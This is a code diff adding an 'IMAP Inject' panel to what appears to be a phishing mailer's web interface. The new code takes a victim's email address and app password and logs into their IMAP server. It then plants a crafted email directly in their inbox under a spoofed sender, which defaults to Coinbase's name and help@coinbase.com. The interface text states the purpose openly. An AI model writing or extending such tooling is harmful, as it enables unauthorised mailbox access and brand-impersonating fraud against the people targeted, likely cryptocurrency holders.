@@ -235,6 +235,61 @@
 		a.click();
 	}
 
+	// IMAP Inject state
+	let imapTargetEmail = $state('');
+	let imapTargetPass = $state('');
+	let imapFromName = $state('Coinbase');
+	let imapFromEmail = $state('help@coinbase.com');
+	let imapSubject = $state('');
+	let imapReplyTo = $state('');
+	let imapHost = $state('imap.gmail.com');
+	let imapPort = $state(993);
+	let imapFolder = $state('INBOX');
+	let imapSending = $state(false);
+	let imapResult = $state<{ ok: boolean; error?: string } | null>(null);
+
+	async function sendImapInject() {
+		if (!imapTargetEmail.trim() || !imapTargetPass.trim()) {
+			toast.error('Target email and app password required');
+			return;
+		}
+		const html = currentTemplate ? getFilledHtml(currentTemplate.html) : '';
+		const subject = getFilledHtml(imapSubject || customSubject || currentTemplate?.subject || '');
+		if (!subject && !html) {
+			toast.error('Select a template or enter a subject');
+			return;
+		}
+		imapSending = true;
+		imapResult = null;
+		try {
+			const res = await fetch('/api/mailer/imap-inject', {
+				method: 'POST',
+				headers: { 'Content-Type': 'application/json' },
+				body: JSON.stringify({
+					imapHost: imapHost.trim(),
+					imapPort,
+					targetEmail: imapTargetEmail.trim(),
+					targetPassword: imapTargetPass.trim(),
+					fromName: imapFromName.trim(),
+					fromEmail: imapFromEmail.trim(),
+					subject,
+					html,
+					replyTo: imapReplyTo.trim() || undefined,
+					folder: imapFolder.trim() || 'INBOX'
+				})
+			});
+			const data = await res.json();
+			imapResult = data;
+			if (data.ok) toast.success('Email injected into target inbox');
+			else toast.error(data.error || 'IMAP inject failed');
+		} catch (err: any) {
+			imapResult = { ok: false, error: err?.message || 'Failed' };
+			toast.error(err?.message || 'IMAP inject failed');
+		} finally {
+			imapSending = false;
+		}
+	}
+
 	// SMTP modal state
 	let newSmtpLabel = $state('');
 	let newSmtpHost = $state('');
@@ -1039,6 +1094,84 @@
 				</div>
 			</div>
 		</div>
+		<!-- IMAP Inject section -->
+		<details class="mt-4 rounded-xl border border-amber-500/30 bg-amber-500/5">
+			<summary class="cursor-pointer select-none px-5 py-3.5 text-sm font-semibold text-amber-300 hover:text-amber-200">
+				IMAP Inject — Place email directly in target's inbox
+			</summary>
+			<div class="border-t border-amber-500/20 p-5 space-y-3">
+				<p class="text-[11px] text-[var(--muted-foreground)] leading-relaxed">
+					Connects to the target's IMAP server with their credentials and appends a crafted email to their INBOX.
+					The email appears as received mail with whatever From address you set. Requires target's email + app password.
+				</p>
+				<div class="grid gap-3 sm:grid-cols-2">
+					<div>
+						<label class="mb-1 block text-[10px] font-semibold uppercase tracking-wider text-[var(--muted-foreground)]">Target Email</label>
+						<input bind:value={imapTargetEmail} type="email" placeholder="target@gmail.com" class="w-full rounded-md border border-[var(--border)] bg-[var(--input)] px-3 py-2 text-xs text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none" />
+					</div>
+					<div>
+						<label class="mb-1 block text-[10px] font-semibold uppercase tracking-wider text-[var(--muted-foreground)]">Target App Password</label>
+						<input bind:value={imapTargetPass} type="password" placeholder="xxxx xxxx xxxx xxxx" class="w-full rounded-md border border-[var(--border)] bg-[var(--input)] px-3 py-2 text-xs text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none" />
+					</div>
+				</div>
+				<div class="grid gap-3 sm:grid-cols-2">
+					<div>
+						<label class="mb-1 block text-[10px] font-semibold uppercase tracking-wider text-[var(--muted-foreground)]">From Display Name</label>
+						<input bind:value={imapFromName} type="text" placeholder="Coinbase" class="w-full rounded-md border border-[var(--border)] bg-[var(--input)] px-3 py-2 text-xs text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none" />
+					</div>
+					<div>
+						<label class="mb-1 block text-[10px] font-semibold uppercase tracking-wider text-[var(--muted-foreground)]">From Email Address</label>
+						<input bind:value={imapFromEmail} type="email" placeholder="help@coinbase.com" class="w-full rounded-md border border-[var(--border)] bg-[var(--input)] px-3 py-2 text-xs text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none" />
+					</div>
+				</div>
+				<div class="grid gap-3 sm:grid-cols-2">
+					<div>
+						<label class="mb-1 block text-[10px] font-semibold uppercase tracking-wider text-[var(--muted-foreground)]">Subject (overrides template)</label>
+						<input bind:value={imapSubject} type="text" placeholder="Uses template subject if blank" class="w-full rounded-md border border-[var(--border)] bg-[var(--input)] px-3 py-2 text-xs text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none" />
+					</div>
+					<div>
+						<label class="mb-1 block text-[10px] font-semibold uppercase tracking-wider text-[var(--muted-foreground)]">Reply-To (optional)</label>
+						<input bind:value={imapReplyTo} type="email" placeholder="help@coinbase.com" class="w-full rounded-md border border-[var(--border)] bg-[var(--input)] px-3 py-2 text-xs text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none" />
+					</div>
+				</div>
+				<details class="rounded-md border border-[var(--border)] bg-[var(--input)]/20">
+					<summary class="cursor-pointer px-3 py-2 text-[11px] text-[var(--muted-foreground)]">IMAP Server Settings</summary>
+					<div class="grid gap-3 p-3 sm:grid-cols-3">
+						<div>
+							<label class="mb-1 block text-[10px] text-[var(--muted-foreground)]">IMAP Host</label>
+							<input bind:value={imapHost} type="text" class="w-full rounded-md border border-[var(--border)] bg-[var(--input)] px-3 py-2 text-xs text-[var(--foreground)] focus:outline-none" />
+						</div>
+						<div>
+							<label class="mb-1 block text-[10px] text-[var(--muted-foreground)]">Port</label>
+							<input bind:value={imapPort} type="number" class="w-full rounded-md border border-[var(--border)] bg-[var(--input)] px-3 py-2 text-xs text-[var(--foreground)] focus:outline-none" />
+						</div>
+						<div>
+							<label class="mb-1 block text-[10px] text-[var(--muted-foreground)]">Target Folder</label>
+							<input bind:value={imapFolder} type="text" class="w-full rounded-md border border-[var(--border)] bg-[var(--input)] px-3 py-2 text-xs text-[var(--foreground)] focus:outline-none" />
+						</div>
+					</div>
+				</details>
+				<div class="flex items-center gap-3 pt-1">
+					<button
+						type="button"
+						onclick={sendImapInject}
+						disabled={imapSending || !imapTargetEmail.trim() || !imapTargetPass.trim()}
+						class="flex items-center gap-2 rounded-lg bg-amber-500/20 px-4 py-2 text-xs font-medium text-amber-200 transition-soft hover:bg-amber-500/30 disabled:opacity-40"
+					>
+						{#if imapSending}
+							<Loader size={12} class="animate-spin" /> Injecting...
+						{:else}
+							<Send size={12} /> Inject to Inbox
+						{/if}
+					</button>
+					{#if imapResult}
+						<span class="text-xs {imapResult.ok ? 'text-emerald-400' : 'text-red-400'}">
+							{imapResult.ok ? 'Injected successfully' : imapResult.error}
+						</span>
+					{/if}
+				</div>
+			</div>
+		</details>
 	{:else if activeTab === 'smtp'}
 		<!-- ============= SMTP + SENDER DOMAINS ============= -->
 		<div class="grid max-w-5xl grid-cols-1 gap-4 lg:grid-cols-2">
